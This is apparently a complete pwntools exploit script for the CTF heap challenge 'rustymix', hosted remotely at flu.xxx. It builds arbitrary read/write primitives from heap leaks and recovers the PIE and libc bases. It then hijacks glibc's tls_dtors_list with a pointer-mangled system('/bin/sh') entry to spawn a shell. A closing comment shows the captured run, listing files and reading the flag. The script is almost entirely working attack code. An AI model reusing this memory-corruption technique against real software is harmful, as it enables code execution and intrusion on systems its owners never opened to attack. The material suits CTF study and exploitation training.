from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './rustymix'
HOST = 'flu.xxx'
PORT = 10130
#HOST = 'localhost'
#PORT = 4444

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		#return process(TARGET)
		return process(TARGET, env={"RUST_BACKTRACE": "full"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()

def create(t):
    r.sendlineafter(b'exit\n> ', b'1')
    r.sendlineafter(b'> ', str(t).encode())
    r.recvuntil(b': ')
    return int(r.recvuntil(b'\n', True))

def put(h, k, v):
    r.sendlineafter(b'exit\n> ', b'2')
    r.sendlineafter(b'> ', str(h).encode())
    r.sendlineafter(b'> ', str(k).encode())
    r.sendlineafter(b'> ', str(v).encode())

def get(h, k):
    r.sendlineafter(b'exit\n> ', b'3')
    r.sendlineafter(b'> ', str(h).encode())
    r.sendlineafter(b'> ', str(k).encode())

def show(h):
    r.sendlineafter(b'exit\n> ', b'4')
    r.sendlineafter(b'> ', str(h).encode())

create(1)
put(0, 0x1111, 0)
put(0, 0x2222, 0)
put(0, 0x3333, 0)
put(0, 0x4444, 0)
put(0, 0x5555, 0)
put(0, 0x6666, 0)
put(0, 0x7777, 0)
put(0, 0x8888, 0)
put(0, 0x9999, 0)
put(0, 0xaaaa, 0)

create(1)
put(1, 0x111111, 1)
put(1, 0x222222, 2)
put(1, 0x333333, 3)
put(1, 0x444444, 4)
put(1, 0x555555, 5)
put(1, 0x666666, 6)
put(1, 0x777777, 7)
put(1, 0x888888, 8)
put(1, 0x999999, 0)
put(1, 0xaaaaaa, 0)

for i in range(3):
    create(1)

show(3)
r.recvuntil(b'Value: ')
leak = int(r.recvuntil(b'\n', True))
show(4)
r.recvuntil(b'Value: ')
leak |= int(r.recvuntil(b'\n', True)) << 32
heap = leak - 0x480

fake_map = heap + 0x310
put(4, 0xdead, (fake_map) >> 32)
get(4, 0xdead)
put(3, 0xdead, (fake_map) & 0xffffffff)
get(3, 0xdead)

put(2, 0x123321, 0x456654)

def aaw32(where, what, spare=0): 
    put(0, 0x2222, (where-8) & 0xffffffff)
    put(0, 0x3333, (where-8) >> 32)
    put(0, 0x6666, 0)
    put(4, what, spare)

def aaw(where, what):
    aaw32(where, what & 0xffffffff)
    aaw32(where+4, what >> 32)

aaw32(heap+0x408-0x2c+0x10, 0xeaea, 0xa)
def aar32(where):
    aaw32(heap+0x408-0x2c, 0xdada, (where-0x2c-8) & 0xffffffff)
    aaw32(heap+0x408-0x2c+4, 0xdada, (where-0x2c-8) >> 32)
    aaw32(where+0x2c, 0xa0000)
    get(2, 0x0)
    show(2)
    r.recvuntil(b'Value: ')
    leak = int(r.recvuntil(b'\n', True))
    return leak

def aar(where):
    return aar32(where) | (aar32(where+4) << 32)

# leak pie
leak = aar32(heap + 0x420)
leak |= heap & 0xffffffff00000000
pie = leak - 0x150080

# leak libc
leak = aar(heap+0x428)
base = leak - 0x216600
system = base + 0x50d70
binsh = base + 0x1d8698
fs_base = base -0x2840

dbg('heap')
dbg('pie')
dbg('base')

def rol(v, n, bits = 64):
    hi = v >> (bits - n)
    out = (( v << n ) | hi) & ((2 ** bits) -1)
    return out

# put tls_dtors_list
fake_handler = fs_base - 0x300

aaw(fs_base + 0x30, 0)
aaw(fs_base - 0xe0, fake_handler )
aaw(fake_handler, rol(system, 0x11))
aaw(fake_handler+8, binsh)

if args.D:
    debug(r, [0x1bed0])

r.sendlineafter(b'exit\n> ', b'5')
r.interactive()
r.close()

'''
[+] Opening connection to flu.xxx on port 10130: Done
    -> heap: 0x556405df8000
    -> pie: 0x55640597a000
    -> base: 0x7f43b03b1000
[*] Switching to interactive mode
Bye!
$ ls
flag.txt  rustymix
$ cat flag.txt
flag{i_th0ugt_i_could_ju5t_use_a_l1ttl3_rust_1n_my_c}
'''
